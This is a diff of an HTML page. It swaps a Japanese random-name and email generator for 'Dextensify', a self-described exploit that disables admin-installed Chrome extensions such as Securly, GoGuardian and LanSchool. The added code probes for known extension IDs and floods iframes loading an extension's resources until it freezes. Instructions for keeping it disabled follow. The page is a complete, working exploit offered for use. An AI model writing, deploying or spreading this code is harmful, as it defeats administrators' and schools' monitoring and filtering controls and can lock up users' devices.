@@ -1,106 +1,290 @@
 <!DOCTYPE html>
-<html lang="ja">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>自動名前生成器</title>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Dextensify</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f0f0f0;
-            padding: 20px;
-        }
-        h1 {
-            color: #333;
-        }
-        input, button {
-            padding: 10px;
-            margin: 5px;
-            font-size: 16px;
-        }
-        #name-container {
-            margin-top: 20px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
-        }
-        .generated-name {
-            margin: 5px 0;
-            font-size: 20px;
-            color: #007BFF;
-        }
+      * {
+        font-family: Sans-serif;
+        color: #d4d3da;
+      }
+      a {
+        color: #6daebd;
+      }
+      a:hover {
+        color: #4f9eb0;
+      }      
+      pre, code {
+        font-family: monospace;
+        background-color: #1e2324;
+        padding: 4px;
+        overflow-x: auto;
+      }
+      pre {
+        padding: 8px;
+      }
+      pre code {
+        background-color: transparent;
+        border: none;
+        padding: 0px;
+      }
+      body {
+        background-color: #1e2324;
+        width: 100%;
+        height: 100%;
+        margin: 0px;
+      }
+      button {
+        background-color: #33626c;
+        padding: 6px;
+        padding-left: 8px;
+        padding-right: 8px;
+        border: transparent;
+        font-size: 15px;
+      }
+      #main_div {
+        max-width: 800px;
+        object-fit: contain;
+
+        background-color: #252b2d;
+
+        padding: 4px;
+        padding-left: 16px;
+        padding-right: 16px;
+        
+        margin: 16px;
+        margin-left: auto;
+        margin-right: auto;
+      }
+      #buttons_container {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 8px;
+      }
     </style>
-</head>
-<body>
-    <h1>自動名前生成器</h1>
-    <label for="count">生成する名前の個数:</label>
-    <input type="number" id="count" min="1" max="10" value="1">
-    <button onclick="generateNames()">名前を生成</button>
-    <div id="name-container"></div>
-
     <script>
-        const firstNames = [
-            "大翔", "陽翔", "悠真", "蓮", "琉斗", "海斗", "陸", "大和", "翔", "陸斗",
-            "蓮斗", "直樹", "健太", "拓海", "聡太", "優斗", "颯太", "大輝", "智也", "和樹",
-            "優真", "聖", "瑞樹", "新", "悠", "智", "慶", "剛", "士", "颯",
-            "陽太", "純", "響", "秀斗", "悠希", "泰斗", "光", "徹", "真", "秀",
-            "雅", "勇気", "裕樹", "信", "航", "貴大", "怜", "剛志", "優介", "拓郎"
-        ];
+      let from_id = id => document.getElementById(id);
+      let extensions = {
+        "securly_new": {
+          name: "Securly",
+          url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"
+        },
+        "securly_old": {
+          name: "Securly (old)",
+          url: "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css"
+        },
+        "goguardian": {
+          name: "Goguardian",
+          url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"
+        },
+        "lanschool": {
+          name: "LANSchool",
+          url: "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html"
+        },
+        "linewize": {
+          name: "Linewize",
+          url: "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html"
+        },
+        "blocksi": {
+          name: "Blocksi",
+          url: "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html"
+        },
+        "fortiguard": {
+          name: "Fortiguard",
+          url: "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js"
+        },
+        "cisco": {
+          name: "Cisco Umbrella",
+          url: "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html"
+        },
+        "contentkeeper": {
+          name: "ContentKeeper",
+          url: "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png"
+        },
+        "securlyclassroom": {
+          name: "Securly Classroom",
+          url: "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html"
+        },
+        "hapara": {
+          name: "Hapara",
+          url: "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html"
+        },
+        "iboss": {
+          name: "iboss",
+          url: "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html"
+        },
+        "lighspeed": {
+          name: "Lightspeed",
+          url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"
+        },
+        "interclass": {
+          name: "InterCLASS Filtering Service",
+          url: "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html"
+        },
+        "intersafe": {
+          name: "InterSafe GatewayConnection Agent",
+          url: "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js"
+        },
+        "gopher_buddy": {
+          name: "Gopher Buddy",
+          url: "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png"
+        },
+        "lanschool_helper": {
+          name: "LanSchool Web Helper",
+          url: "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html"
+        },
+        "imtlazarus": {
+          name: "IMTLazarus",
+          url: "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json"
+        },
+        "impero_backdrop": {
+          name: "Impero Backdrop",
+          url: "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html"
+        },
+        "mobile_guardian": {
+          name: "Mobile Guardian",
+          url: "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html"
+        },
+      };
 
-        const lastNames = [
-            "佐藤", "鈴木", "高橋", "田中", "伊藤", "渡辺", "山本", "中村", "小林", "加藤",
-            "吉田", "山田", "佐々木", "山口", "井上", "松本", "清水", "斉藤", "福田", "後藤",
-            "岡田", "前田", "長谷川", "村上", "石川", "藤田", "金子", "坂本", "田辺", "小川",
-            "原田", "岡本", "安藤", "横山", "中島", "高木", "田島", "久保", "西村", "白石",
-            "杉本", "鈴村", "谷口", "片桐", "大野", "渡部", "小野", "丸山", "井口", "石井"
-        ];
+      async function check_url(url) {
+        let controller = new AbortController();
+        let timeout = setTimeout(() => controller.abort(), 500);
 
-        function generateNames() {
-            const count = document.getElementById("count").value;
-            const nameContainer = document.getElementById("name-container");
-            nameContainer.innerHTML = ''; // 既存の名前をクリア
+        try {
+          await fetch(url, {signal: controller.signal});
+          return true;
+        }
+        catch (error) {
+          let error_msg = error+"";
+          return error_msg.includes("AbortError");
+        }
+      }
+      
+      async function detect_extensions() {
+        let detected = [];
+        for (let extension of Object.values(extensions)) {
+          let exists = await check_url(extension.url);
+          if (exists) {
+            detected.push(extension);
+          }
+        }
+        return detected;
+      }
 
-            for (let i = 0; i < count; i++) {
-                const randomFirstName = firstNames[Math.floor(Math.random() * firstNames.length)];
-                const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
-                
-                // ローマ字変換（簡易的）
-                const romajiFirstName = randomFirstName.replace(/大/g, 'Dai').replace(/陽/g, 'You').replace(/悠/g, 'Yuu')
-                    .replace(/蓮/g, 'Ren').replace(/琉/g, 'Ryu').replace(/海/g, 'Kai').replace(/陸/g, 'Riku')
-                    .replace(/和/g, 'Kazu').replace(/翔/g, 'Sho').replace(/直/g, 'Nao').replace(/健/g, 'Ken')
-                    .replace(/優/g, 'Yuu').replace(/聡/g, 'Sato').replace(/大輝/g, 'Daiki').replace(/智/g, 'Tom')
-                    .replace(/聖/g, 'Sei').replace(/瑞/g, 'Zui').replace(/新/g, 'Arata').replace(/悠真/g, 'Yuma');
+      async function main() {
+        let detected = await detect_extensions();
+        let buttons_container = from_id("buttons_container")
 
-                const romajiLastName = randomLastName.replace(/佐/g, 'Sato').replace(/鈴/g, 'Suzuki').replace(/高/g, 'Takahashi')
-                    .replace(/田/g, 'Taka').replace(/中/g, 'Naka').replace(/小/g, 'Ko').replace(/加/g, 'Kato')
-                    .replace(/吉/g, 'Yoshida').replace(/山/g, 'Yama').replace(/井/g, 'I').replace(/本/g, 'Moto');
-
-                const email = `${romajiFirstName.toLowerCase()}${romajiLastName.toLowerCase()}@tbnetwork.net`;
-
-                const nameElement = document.createElement("div");
-                nameElement.className = "generated-name";
-                nameElement.textContent = `名前: ${randomLastName} ${randomFirstName}, メール: ${email}`;
-
-                // コピーボタンを作成
-                const copyButton = document.createElement("button");
-                copyButton.textContent = "コピー";
-                copyButton.onclick = () => copyToClipboard(nameElement.textContent);
-
-                nameElement.appendChild(copyButton);
-                nameContainer.appendChild(nameElement);
-            }
+        if (!window.chrome) {
+          buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
+          return;
+        }
+        else if (detected.length === 0) {
+          buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
+          buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">Github repository</a>, and provide the extension ID and manifest.</p>`;
+          return;
+        }
+        else {
+          buttons_container.innerHTML = ""
         }
 
-        function copyToClipboard(text) {
-            navigator.clipboard.writeText(text).then(() => {
-                alert(text + " をコピーしました!");
-            }).catch(err => {
-                console.error("コピーに失敗しました:", err);
-            });
+        for (let extension of detected) {
+          let button = document.createElement("button");
+          button.innerText = `Freeze ${extension.name}`;
+          button.onclick = () => {
+            button_handler(extension);
+          }
+          buttons_container.append(button);
         }
+      }
+
+      function button_handler(extension) {
+        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
+        if (cancel) return;
+        
+        setTimeout(() => {
+          create_iframes(extension);
+        }, 5000);
+      }
+
+      function create_iframes(extension) {
+        let iframes = []
+        let iterations = 5;
+        let public_url = extension.url;
+        
+        while (true) {
+          let iframe = document.createElement("iframe");
+          document.body.append(iframe);
+          iframes.push(iframe);
+
+          //let subframe_count = Math.max(2, 200 - iterations);
+          for (let i=0; i<50; i++) {
+            let subframe = document.createElement("iframe");
+            subframe.src = public_url;
+            subframe.style.width = subframe.style.height = "1px";
+            iframe.contentDocument.body.append(subframe);
+          }
+
+          while (iframes.length > Math.max(3, 10-iterations)) {
+            iframes[0].remove();
+            iframes.shift();
+          }
+
+          iterations++;
+        }
+      }
+
+      window.onload = main;
     </script>
-</body>
-</html>
+  </head>
+  <body data-new-gr-c-s-check-loaded="8.908.0" data-gr-ext-installed="">
+    <div id="main_div">
+      <h1 style="margin-top: 8px">Dextensify</h1>
+      <p>Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage.</p>
+      <h2>Instructions</h2>
+      <ol>
+        <li>Open chrome://extensions in a new tab. Keep this page open.</li>
+        <li>Go to the settings page for the extension you want to disable.</li>
+        <li>On the Dextensify page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
+        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
+        <li>The extension should now be temporarily disabled. For this 
+effect to persist, flip the "allow access to file URLs" again every few 
+minutes, or if pages start getting blocked again.</li>
+        <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
+      </ol>
+      <p>During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.</p>
+      <div id="buttons_container"><p><b>Error: You are not running a Chromium-based browser.</b></p></div>
+      <br>
+      <hr>
+      <details>
+        <summary style="margin-bottom: 8px;">
+          Made by <a href="https://ading.dev/" target="_blank">ading2210</a>. This file is licensed under the MIT license.
+        </summary>
+        <pre>MIT License
+Copyright (c) 2023 ading2210
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.</pre>
+        <p style="font-size: 13px; text-align: right;"><i>Version 1.1.1</i></p>
+      </details>
+    </div>
+  
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
